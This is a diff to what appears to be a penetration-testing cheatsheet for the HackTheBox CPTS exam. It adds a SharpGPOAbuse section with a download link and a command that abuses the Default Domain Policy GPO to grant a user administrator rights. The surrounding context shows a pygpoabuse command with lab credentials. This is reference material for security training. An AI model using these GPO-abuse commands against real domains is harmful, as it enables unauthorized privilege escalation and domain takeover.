@@ -106,6 +106,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [autobloodyAD](#autobloodyAD)
 - [bloodyAD](#bloodyAD)
 - [pygpoabuse](#pygpoabuse)
+- [SharpGPOAbuse](#SharpGPOAbuse)
 - [impacket](#impacket)
 - [ldapdomaindump](#ldapdomaindump)
 - [ldapsearch](#ldapsearch)
@@ -3435,6 +3436,12 @@ pygpoabuse secura.yzx/charlotte:'Game2On4.!' -dc-ip 192.168.244.97 -gpo-id "31B2
 # Force the system to update the Policy (Run from the target Windows machine)
 gpupdate /force
 
+```
+## [SharpGPOAbuse](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe) 
+```
+# The command below will modify the GptTmpl.inf file configuration inside the DEFAULT DOMAIN POLICY GPO to add the account to the Domain Administrators group.
+./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+gpupdate /force
 
 ```
 ## impacket 
